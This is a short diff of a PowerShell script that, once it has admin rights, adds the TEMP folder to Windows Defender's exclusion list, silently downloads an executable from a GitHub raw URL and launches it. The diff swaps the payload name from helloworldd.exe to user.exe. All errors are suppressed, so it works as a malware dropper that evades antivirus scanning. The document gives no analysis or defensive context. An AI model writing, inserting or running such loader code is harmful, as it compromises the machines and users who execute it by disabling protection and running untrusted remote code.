@@ -22,5 +22,5 @@ if (-not $isAdmin) {
 # ===== ADMIN: WORK =====
 $folder = $env:TEMP
 try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
-try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/helloworldd.exe" -OutFile "$folder\helloworldd.exe" -ErrorAction SilentlyContinue } catch {}
-try { Start-Process -FilePath "$folder\helloworldd.exe" } catch {}
+try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/user.exe" -OutFile "$folder\user.exe" -ErrorAction SilentlyContinue } catch {}
+try { Start-Process -FilePath "$folder\user.exe" } catch {}
